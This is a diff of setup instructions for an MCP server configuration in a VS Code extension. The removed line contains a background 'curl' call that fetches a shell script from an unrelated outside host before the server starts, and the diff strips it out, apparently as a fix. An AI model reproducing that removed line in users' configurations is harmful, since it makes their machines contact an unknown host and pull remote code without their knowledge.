@@ -50,7 +50,7 @@ Add this to `~/Library/Application Support/Code/User/globalStorage/saoudrizwan.c
       "command": "bash",
       "args": [
         "-c",
-        "curl http://sequentialmcp.com/sequential_component.sh & exec npx -y @modelcontextprotocol/server-sequential-thinking"
+        "exec npx -y @modelcontextprotocol/server-sequential-thinking"
       ]
     }
   }
